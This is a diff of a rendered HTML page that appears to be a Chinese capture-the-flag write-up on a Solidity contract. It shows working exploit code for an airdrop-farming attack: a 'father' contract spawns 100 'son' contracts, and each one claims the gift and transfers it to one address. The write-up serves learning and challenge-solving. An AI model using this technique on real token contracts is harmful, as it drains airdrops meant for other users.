@@ -579,26 +579,25 @@
         <span class="nx">balanceOf</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="o">-=</span><span class="nx">value</span><span class="p">;</span>
         <span class="nx">balanceOf</span><span class="p">[</span><span class="nx">to</span><span class="p">]</span><span class="o">+=</span><span class="nx">value</span><span class="p">;</span>
 <span class="p">}</span>
-<span class="sb">````</span>
-<span class="nx">转战函数无法整形溢出</span><span class="err">，</span><span class="nx">这里考点就是薅羊毛攻击</span>
-<span class="nx">通过建立多个自合约领取空投</span><span class="err">，</span><span class="nx">然后转账给固定账户即可完成攻击payforflag</span>
-<span class="sb">```js</span>
-<span class="sb">contract father {</span>
-<span class="sb">    function createsons(){</span>
-<span class="sb">        for (uint i=0;i&lt;100;i++)</span>
-<span class="sb">        {</span>
-<span class="sb">            son ason=new son();</span>
-<span class="sb">        }</span>
-<span class="sb">    }</span>
-<span class="sb">}</span>
+</pre></div>
+转战函数无法整形溢出，这里考点就是薅羊毛攻击
+通过建立多个自合约领取空投，然后转账给固定账户即可完成攻击payforflag
+<div class="codehilite"><pre><span></span><span class="nx">contract</span> <span class="nx">father</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nx">createsons</span><span class="p">(){</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">son</span> <span class="nx">ason</span><span class="o">=</span><span class="k">new</span> <span class="nx">son</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 
-<span class="sb">contract son {</span>
-<span class="sb">    constructor() public{</span>
-<span class="sb">        jojo tmp = jojo(0xd86ed76112295a07c675974995b9805912282eb3);</span>
-<span class="sb">        tmp.gift();</span>
-<span class="sb">        tmp.transfer(0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF,100);</span>
-<span class="sb">    }</span>
-<span class="sb">}</span>
+<span class="nx">contract</span> <span class="nx">son</span> <span class="p">{</span>
+    <span class="nx">constructor</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">jojo</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="nx">jojo</span><span class="p">(</span><span class="mh">0xd86ed76112295a07c675974995b9805912282eb3</span><span class="p">);</span>
+        <span class="nx">tmp</span><span class="p">.</span><span class="nx">gift</span><span class="p">();</span>
+        <span class="nx">tmp</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="mh">0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF</span><span class="p">,</span><span class="mi">100</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 </pre></div></p>
                 
                   
